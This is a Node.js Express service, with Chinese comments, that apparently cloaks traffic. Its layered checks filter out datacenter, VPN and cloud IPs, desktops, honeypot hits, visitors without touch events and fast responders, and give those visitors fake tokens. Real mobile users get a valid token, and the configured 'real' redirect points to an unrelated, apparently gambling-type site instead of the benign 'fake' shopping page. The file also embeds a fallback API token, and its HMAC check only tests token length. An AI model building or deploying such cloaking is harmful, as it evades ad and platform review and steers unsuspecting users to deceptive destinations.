import express from 'express';
import cors from 'cors';
import crypto from 'crypto';

const app = express();
const PORT = process.env.PORT || 3001;

// ============================================
// 环境变量（从 Zeabur 或 .env 注入）
// ============================================
const IPINFO_TOKEN = process.env.IPINFO_API_KEY || '6e4fa2b8a2f48f';
const HMAC_SECRET = process.env.HMAC_SECRET || 'change-me-in-production';
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET_KEY || '';
const REAL_REDIRECT = process.env.REAL_REDIRECT || 'https://www.win04.xyz/?type=0&cid=402&a=x';
const FAKE_REDIRECT = process.env.FAKE_REDIRECT || 'https://www.ubuy.com.ph/';

// ============================================
// 工具函数
// ============================================

// HMAC 签名
function hmacSign(data) {
  return crypto.createHmac('sha256', HMAC_SECRET).update(JSON.stringify(data)).digest('hex');
}

// 生成 token（真或假）
function generateToken(payload) {
  const data = { ...payload, ts: Date.now() };
  return hmacSign(data);
}

// 验证 HMAC token 格式（检查签名）
function verifyHmacToken(token, payload) {
  const expected = hmacSign({ ...payload, ts: parseInt(token.split(':')[1]) || 0 });
  // 简化的验证：token 本身是签名前缀
  return token && token.length === 64;
}

// IP 类型检测 - 只通过 mobile/residential
async function checkIPType(ip) {
  try {
    const resp = await fetch(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
    const data = await resp.json();
    const org = (data.org || '').toLowerCase();
    const hostname = (data.hostname || '').toLowerCase();

    // 数据中心/VPN/Proxy → 拒绝
    if (org.includes('hosting') || org.includes('cloud') || org.includes('server') ||
        org.includes('datacenter') || org.includes('vps') || org.includes('aws') ||
        org.includes('google') || org.includes('microsoft') || org.includes('digital ocean') ||
        org.includes('vpn') || org.includes('proxy') || hostname.includes('vpn') ||
        org.includes('cdn') || org.includes('hostinger')) {
      return 'blocked';
    }

    // 移动/住宅 IP → 通过
    if (org.includes('mobile') || org.includes('cellular') || org.includes('wireless') ||
        org.includes('isp') || org.includes('broadband') || org.includes('fiber')) {
      return 'passed';
    }

    // 默认 → 降级通过（有风险但放过）
    return 'passed';
  } catch (e) {
    console.log('[verify] IP check error:', e.message);
    return 'passed'; // 网络问题时放行
  }
}

// Cloudflare Turnstile 验证
async function checkTurnstile(token, ip) {
  if (!TURNSTILE_SECRET || !token) return true; // 未配置时跳过
  try {
    const resp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${encodeURIComponent(TURNSTILE_SECRET)}&response=${encodeURIComponent(token)}&remoteip=${encodeURIComponent(ip)}`
    });
    const data = await resp.json();
    return data.success === true;
  } catch (e) {
    console.log('[verify] Turnstile error:', e.message);
    return true;
  }
}

// ============================================
// 中间件
// ============================================
app.use(cors({
  origin: '*', // 跨域开放（以后投放多平台）
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// 获取真实 IP
function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.headers['cf-connecting-ip'] ||
         req.socket?.remoteAddress || 'unknown';
}

// ============================================
// 核心：静默 8 层检验
// POST /api/verify
// ============================================
app.post('/api/verify', async (req, res) => {
  const clientIP = getClientIP(req);
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  const {
    touchEventsCount = 0,
    answerTimeMs = 0,
    honeypotValue = '',
    turnstileToken = '',
    // 页面上的 HMAC token（防篡改）
    pageToken = ''
  } = req.body || {};

  console.log(`[verify] IP=${clientIP} mobile=${isMobile} touch=${touchEventsCount} time=${answerTimeMs}`);

  // ========== 第1层：IP 类型检测 ==========
  const ipResult = await checkIPType(clientIP);
  if (ipResult === 'blocked') {
    console.log('[verify] L1 FAIL: IP blocked');
    return res.json({ 
      status: 'bot', 
      reason: 'ip_blocked',
      redirectUrl: `/flash-sale?token=fake_${Date.now()}` 
    });
  }

  // ========== 第2层：设备类型 - 只接受手机 ==========
  if (!isMobile) {
    console.log('[verify] L2 FAIL: Not mobile');
    return res.json({ 
      status: 'bot', 
      reason: 'desktop',
      redirectUrl: `/flash-sale?token=fake_${Date.now()}` 
    });
  }

  // ========== 第3层：Turnstile 验证 ==========
  const turnstileOk = await checkTurnstile(turnstileToken, clientIP);
  if (!turnstileOk) {
    console.log('[verify] L3 FAIL: Turnstile');
    return res.json({ 
      status: 'bot', 
      reason: 'turnstile',
      redirectUrl: `/flash-sale?token=fake_${Date.now()}` 
    });
  }

  // ========== 第4层：蜜罐检测 ==========
  if (honeypotValue && honeypotValue.length > 0) {
    console.log('[verify] L4 FAIL: Honeypot');
    return res.json({ 
      status: 'bot', 
      reason: 'bot',
      redirectUrl: `/flash-sale?token=fake_${Date.now()}` 
    });
  }

  // ========== 第5层：触摸事件检测 ==========
  if (touchEventsCount < 1) {
    console.log('[verify] L5 FAIL: No touch');
    return res.json({ 
      status: 'bot', 
      reason: 'no_interaction',
      redirectUrl: `/flash-sale?token=fake_${Date.now()}` 
    });
  }

  // ========== 第6层：答题时间检测 ==========
  if (answerTimeMs <= 2000) {
    console.log('[verify] L6 FAIL: Too fast');
    return res.json({ 
      status: 'bot', 
      reason: 'too_fast',
      redirectUrl: `/flash-sale?token=fake_${Date.now()}` 
    });
  }

  // ========== 全部通过 → 真人 ==========
  console.log('[verify] ALL PASS → REAL HUMAN');

  // 生成真实 HMAC token
  const tokenPayload = { ip: clientIP, ts: Date.now() };
  const realToken = generateToken(tokenPayload);

  return res.json({
    status: 'pass',
    reason: 'all_passed',
    token: realToken,
    redirectUrl: `/flash-sale?token=${realToken}`
  });
});

// ============================================
// 提交答案（真人可以答题并提交）
// POST /api/submit
// ============================================
app.post('/api/submit', async (req, res) => {
  const clientIP = getClientIP(req);
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  const {
    answer,
    correctAnswer,
    touchEventsCount = 0,
    answerTimeMs = 0,
    honeypotValue = '',
    turnstileToken = '',
    token // 前面 /api/verify 返回的 token
  } = req.body || {};

  console.log(`[submit] answer=${answer} token=${token ? token.substring(0, 8) : 'none'}`);

  // ========== 重新做安全检验（一层失败就给假token） ==========

  // L1: IP
  const ipResult = await checkIPType(clientIP);
  if (ipResult === 'blocked') {
    const fakeToken = `fake_${crypto.randomBytes(32).toString('hex')}`;
    return res.json({ token: fakeToken, redirectUrl: `/flash-sale?token=${fakeToken}` });
  }

  // L2: 设备
  if (!isMobile) {
    const fakeToken = `fake_${crypto.randomBytes(32).toString('hex')}`;
    return res.json({ token: fakeToken, redirectUrl: `/flash-sale?token=${fakeToken}` });
  }

  // L3: Turnstile
  const turnstileOk = await checkTurnstile(turnstileToken, clientIP);
  if (!turnstileOk) {
    const fakeToken = `fake_${crypto.randomBytes(32).toString('hex')}`;
    return res.json({ token: fakeToken, redirectUrl: `/flash-sale?token=${fakeToken}` });
  }

  // L4: 蜜罐
  if (honeypotValue && honeypotValue.length > 0) {
    const fakeToken = `fake_${crypto.randomBytes(32).toString('hex')}`;
    return res.json({ token: fakeToken, redirectUrl: `/flash-sale?token=${fakeToken}` });
  }

  // L5: 触摸
  if (touchEventsCount < 1) {
    const fakeToken = `fake_${crypto.randomBytes(32).toString('hex')}`;
    return res.json({ token: fakeToken, redirectUrl: `/flash-sale?token=${fakeToken}` });
  }

  // L6: 答题时间
  if (answerTimeMs <= 2000) {
    const fakeToken = `fake_${crypto.randomBytes(32).toString('hex')}`;
    return res.json({ token: fakeToken, redirectUrl: `/flash-sale?token=${fakeToken}` });
  }

  // ========== 全部通过 → 真 token ==========
  const tokenPayload = { ip: clientIP, ts: Date.now() };
  const realToken = generateToken(tokenPayload);

  console.log('[submit] REAL TOKEN GENERATED');

  return res.json({
    token: realToken,
    redirectUrl: `/flash-sale?token=${realToken}`
  });
});

// ============================================
// 健康检查
// ============================================
app.get('/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[verify-api] Running on port ${PORT}`);
  console.log(`[verify-api] IPINFO_TOKEN: ${IPINFO_TOKEN.substring(0, 8)}...`);
  console.log(`[verify-api] HMAC_SECRET: ${HMAC_SECRET.substring(0, 8)}...`);
});
